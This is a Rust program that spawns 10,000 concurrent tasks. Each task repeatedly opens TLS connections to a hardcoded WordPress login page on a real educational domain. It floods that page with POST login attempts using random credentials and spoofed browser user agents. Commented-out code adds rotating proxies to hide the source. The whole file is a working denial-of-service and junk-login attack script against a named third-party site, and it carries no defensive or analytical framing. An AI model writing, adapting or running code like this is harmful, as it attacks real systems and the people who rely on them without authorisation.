use std::borrow::Cow;
use std::collections::HashMap;

use std::time::{Duration, UNIX_EPOCH, SystemTime};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio;
use regex::Regex;
use native_tls::TlsConnector;
use tokio_native_tls::TlsConnector as tokio_TlsConnector;
use async_std::future;
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use url::Url;
use serde::{Deserialize, Serialize};


const MESSAGE_SIZE: usize = 1024;
const READ_TIMEOUT: Duration = Duration::from_millis(1);
const REQ_TIMEOUT: Duration = Duration::from_secs(3);
const CONNECT_TIMEOUT: Duration = Duration::from_secs(30);


/// Capitalizes the first character in s.
fn capitalize(s: Cow<str>) -> String {
    let mut c = s.split("-");
    let mut list_char:Vec<String>  = vec![];
    loop  {
            let f_raw = c.next();
            if f_raw.is_none() {
                break;
            }
            let f = f_raw.unwrap();
            let char = f.chars().nth(0).unwrap();
            let out = f.replacen(char, char.to_uppercase().to_string().as_str(), 1);
            list_char.append(&mut vec![out]);
    }
    return list_char.join("-");
}

fn make_html_string<'a>(method_raw: &'a str, path:&'a str, headers_dict_r: HashMap<&'a str, &'a str>, body: &'a [u8]) -> Vec<u8> {
    let method = method_raw.to_uppercase();
    let mut headers_dict = headers_dict_r.clone();
    let mut headers = "".to_string();
    let size = String::from(body.len().to_string());
    headers_dict.insert("Accept", "*/*");
    if !body.is_empty() {
        headers_dict.insert("Content-Length", size.as_str());
        if headers_dict.get("Content-Type").is_none() {
            headers_dict.insert("Content-Type", "text/plain");
        }
    }
    let re = Regex::new(r"\s").unwrap();
    for i in headers_dict {
        headers += format!("\r\n{}: {}", capitalize(re.replace_all(i.0, "-")), i.1).as_str();
    }
    let out = Vec::from(format!("{} {} HTTP/1.1{}\r\n\r\n", method, path, headers).as_bytes());
    let body_raw = Vec::from(body);
    let res:Vec<u8> = [out, body_raw].concat();
    return res;
}

async fn make_req(url: String, auth_token: String) {
    let _ = auth_token;
    let _ = url;
    loop {
        let req_url = Url::parse("https://c3may.edu.vn/ktra/wp-login.php").unwrap();
        let host = req_url.host().unwrap().to_string();
        let port;
        if req_url.port().is_none() {
            port = "443".to_string()
        } else {
            port = req_url.port().unwrap().to_string();
        }
        let tcp_timeout_check = future::timeout(CONNECT_TIMEOUT, TcpStream::connect(format!("{host}:{port}"))).await;
        if tcp_timeout_check.is_err() { continue; }
        let stream_raw = tcp_timeout_check.unwrap();
        if stream_raw.is_err() { continue; }
        let stream_raw = stream_raw.unwrap();
        // proxy
        /*
        let mut headers_dict = HashMap::new();
            headers_dict.insert("Host", host.as_str());
            headers_dict.insert("Proxy-Authorization", auth_token.as_str());
            headers_dict.insert("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
        let data = make_html_string("Connect", format!("{}:{}", host, port).as_str(), headers_dict, &[]);
        let _sended = stream_raw.write(data.as_slice()).await.unwrap();
        let mut rx_bytes = [0; MESSAGE_SIZE];
        let read_raw = stream_raw.read(&mut rx_bytes).await.unwrap();
        let raw_result = std::str::from_utf8(&rx_bytes[..read_raw]);
        println!("Proxy: {:?}", raw_result.unwrap());
        */
        let connector = TlsConnector::new().unwrap();
        let tokio_connector = tokio_TlsConnector::from(connector);
        let stream_rs = tokio_connector.connect(host.as_str(), stream_raw).await;
        if stream_rs.is_err() {
            break
        }
        let mut stream = stream_rs.unwrap();
        let mut closed = false;
        loop {
            let mut headers_dict = HashMap::new();
            headers_dict.insert("Host", host.as_str());
            headers_dict.insert("Cache-Control", "no-cache");
            headers_dict.insert("User-Agent", ua_generator::ua::spoof_ua());
            let mut rng = {
                let rng = rand::thread_rng();
                StdRng::from_rng(rng).unwrap()
            };
            let bsx = rng.gen_range(0..99999);
            let bsx2 = rng.gen_range(0..99999);
            let body_str = format!("log={}&pwd={}&rememberme=forever&wp-submit=Log+In&redirect_to=https%3A%2F%2Fc3may.edu.vn%2Fktra%2Fwp-admin%2F&testcookie=1",
                                   bsx.to_string(), bsx2.to_string(),);
            let data = make_html_string("post", req_url.path(), headers_dict, body_str.as_bytes());
            let _sended = stream.write(data.as_slice()).await.unwrap();
            let mut has_read = false;
            loop {
                let mut rx_bytes = [0; MESSAGE_SIZE];
                let read_raw = stream.read(&mut rx_bytes);
                let timeout_d;
                if has_read {
                    timeout_d = READ_TIMEOUT
                } else {
                    timeout_d = REQ_TIMEOUT
                }
                let timeout_check = future::timeout(timeout_d, read_raw).await;
                has_read = true;
                if timeout_check.is_err() {
                    break;
                }
                let check = timeout_check.unwrap().unwrap();
                let raw_result = std::str::from_utf8(&rx_bytes[..check]);
                if raw_result.is_err() {
                    continue;
                }
                let received = raw_result.unwrap();
                if (check as u32) == 0 {
                    closed = true;
                    break;
                } else {
                    let current_timestamp: i64 = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
                    let data = received.split("\r\n").next().unwrap();
                    if data.starts_with("HTTP") {
                        println!("{} | {}", data, current_timestamp);
                    }
                    break;
                }
            }
            if closed {
                break
            }
        }

        stream.shutdown().await.unwrap();
        println!("exit");
    }
}

#[derive(Default, Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Root {
    pub items: Vec<Item>,
}

#[derive(Default, Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Item {
    pub url: String,
    #[serde(rename = "auth_token")]
    pub auth_token: String,
}

async fn get_proxy() -> Result<Root, &'static str> {
    let result_rs_raw = reqwest::get("http://localhost:1234/").await;
    if result_rs_raw.is_err() {
        return Err("brush");
    }
    let result_rs = result_rs_raw.unwrap();
    let result = result_rs.json::<Root>().await;
    if result.is_err() {
        return Err("brush");
    }
    Ok(result.unwrap())
}

#[tokio::main]
async fn main() {
    let ops: [usize; 10000] = core::array::from_fn(|i| i + 1);
    let mut tasks = Vec::with_capacity(ops.len());
    for _i in ops {
        tasks.push(tokio::spawn(make_req("lol".to_string(), "lol".to_string())));
        /* 
        let out = get_proxy().await;
        if out.is_err() {
            break;
        }
        for i in out.unwrap().items {
            tasks.push(tokio::spawn(make_req(i.url, i.auth_token)));
        }
        */
    }
    println!("Spawned");
    for task in tasks {
        let tasklol = task.await;
        if tasklol.is_ok() {
            tasklol.unwrap();
        }
    }
}